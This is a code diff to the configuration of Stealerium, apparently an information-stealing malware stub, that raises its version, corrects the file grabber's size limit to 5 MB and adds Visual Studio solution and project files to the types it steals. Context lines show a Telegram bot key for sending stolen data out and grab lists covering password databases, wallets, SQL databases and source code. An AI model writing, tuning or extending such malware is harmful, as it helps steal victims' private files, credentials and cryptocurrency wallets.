@@ -1,11 +1,11 @@
-﻿using System.Collections.Generic;
+using System.Collections.Generic;
 using Stealerium.Stub.Modules.Implant;
 
 namespace Stealerium.Stub
 {
     public static class Config
     {
-        public static string Version = "v3.5.0";
+        public static string Version = "v3.5.1";
 
 #if DEBUG
         // Telegram bot API key
@@ -113,9 +113,8 @@ namespace Stealerium.Stub
             "porn", "sex", "hentai", "chaturbate"
         };
 
-
-        // Maximum file size
-        public static int GrabberSizeLimit = 5120; // 5MB
+        // Maximum file size (5 MB)
+        public static int GrabberSizeLimit = 5 * 1024 * 1024; // 5,242,880 bytes
 
         // Grabber file types:
         public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
@@ -125,7 +124,7 @@ namespace Stealerium.Stub
                 { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" },
             ["SourceCode"] = new[]
             {
-                "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
+                "c", "cs", "sln", "csproj", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
                 "java", "kt", "kts", "ino"
             },
             ["Image"] = new[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
